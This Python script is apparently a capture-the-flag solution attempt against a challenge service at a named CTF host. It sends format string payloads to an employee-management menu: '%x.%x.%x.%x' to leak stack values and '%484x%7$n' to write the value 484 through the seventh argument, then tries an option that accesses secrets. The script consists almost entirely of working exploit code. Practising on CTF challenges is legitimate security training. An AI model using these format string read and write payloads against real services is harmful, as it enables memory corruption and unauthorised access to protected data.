#!/usr/bin/env python3
"""
Format string vulnerability test
"""

import socket
import time

HOST = 'chals.uscc-cyberbowl-2025.ctf.institute'
PORT = 3013

def send_recv(sock, cmd, delay=0.4):
    sock.sendall(cmd.encode() + b'\n')
    time.sleep(delay)
    return sock.recv(8192).decode('latin-1', errors='ignore')

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    sock.connect((HOST, PORT))
    
    send_recv(sock, '')  # banner
    
    # Try format string in name
    print("[*] Testing format string in name field...")
    send_recv(sock, '1')
    send_recv(sock, '%x.%x.%x.%x')  # Format string payload
    data = send_recv(sock, '484')
    print(data)
    
    # List employees to see if format string was executed
    data = send_recv(sock, '4')
    print("\n[*] Employee list:")
    print(data[:800])
    
    # Check if we can write with %n
    print("\n[*] Trying write with %n...")
    send_recv(sock, '1')
    send_recv(sock, '%484x%7$n')  # Try to write 484 to 7th argument
    send_recv(sock, '484')
    
    data = send_recv(sock, '4')
    print(data[:800])
    
    # Access secrets
    data = send_recv(sock, '3')
    print("\n[*] Access attempt:")
    print(data)
    
    try:
        more = sock.recv(4096).decode('latin-1', errors='ignore')
        if more:
            print(more)
    except:
        pass
    
    sock.close()

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f"Error: {e}")
